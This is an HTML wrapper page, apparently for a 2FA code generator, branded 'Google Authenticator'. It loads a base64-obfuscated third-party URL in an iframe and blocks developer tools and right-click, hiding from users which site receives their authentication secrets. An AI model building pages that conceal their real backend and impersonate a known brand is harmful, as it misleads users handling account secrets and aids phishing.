<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Generate Two-Factor Authentication (2FA) codes using Google Authenticator.">
  <meta name="keywords" content="2FA, Two-Factor Authentication, Google Authenticator, OTP, Security">
  <meta name="robots" content="index, follow">

  <meta property="og:title" content="Two-Factor Authentication - Google Authenticator">
  <meta property="og:description" content="Generate secure 2FA codes for your accounts.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://fast2fa.vercel.app">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Two-Factor Authentication - Google Authenticator">
  <meta name="twitter:description" content="Easily generate secure 2FA codes.">

  <title>Two-Factor Authentication - Google Authenticator</title>

  <style>
    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      height: 100%;
      overflow: hidden;
    }

    iframe {
      width: 100%;
      height: 100vh;
      border: none;
    }

    /* Tombol refresh manual */
    .refresh-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: rgba(255, 255, 255, 0.8);
      color: #000;
      border: none;
      padding: 10px 15px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      z-index: 1000;
    }

    .refresh-btn:hover {
      background-color: rgba(255, 255, 255, 1);
    }
  </style>
</head>

<body>

  <!-- Iframe dengan izin copy & clipboard -->
  <iframe id="iframe" sandbox="allow-scripts allow-same-origin allow-modals allow-forms" allowfullscreen></iframe>

  <!-- Tombol Refresh Manual -->
  <button class="refresh-btn" onclick="reloadIframe()">ðŸ”„ Refresh</button>

  <script>
    // Mengatur URL iframe dari base64 untuk keamanan
    window.onload = function () {
      var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
      document.getElementById('iframe').src = iframeUrl;
    };

    // Fungsi untuk merefresh iframe tanpa reload seluruh halaman
    function reloadIframe() {
      let iframe = document.getElementById('iframe');
      iframe.src = iframe.src; // Menyetel ulang sumber untuk refresh iframe
    }

    // Mencegah pull-to-refresh di Android
    let touchStartY = 0, touchEndY = 0;
    document.addEventListener('touchstart', function (event) {
      touchStartY = event.touches[0].clientY;
    });

    document.addEventListener('touchmove', function (event) {
      touchEndY = event.touches[0].clientY;

      // Cegah refresh jika swipe ke bawah dari atas halaman
      if (window.scrollY === 0 && touchEndY > touchStartY) {
        event.preventDefault();
      }
    }, { passive: false });

    // Double-tap untuk refresh iframe
    let lastTap = 0;
    document.addEventListener('touchend', function (event) {
      let currentTime = new Date().getTime();
      let tapLength = currentTime - lastTap;

      if (tapLength < 300 && tapLength > 0) {
        reloadIframe(); // Refresh iframe jika double-tap
      }

      lastTap = currentTime;
    });

    // Mencegah inspeksi elemen & klik kanan
    document.addEventListener('keydown', function (event) {
      if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.ctrlKey && event.key === 'U')) {
        event.preventDefault();
      }
    });

    document.addEventListener('contextmenu', function (event) {
      event.preventDefault();
    });

    document.addEventListener('mousedown', function (event) {
      if (event.button === 2) {
        event.preventDefault();
      }
    });
  </script>

</body>

</html>
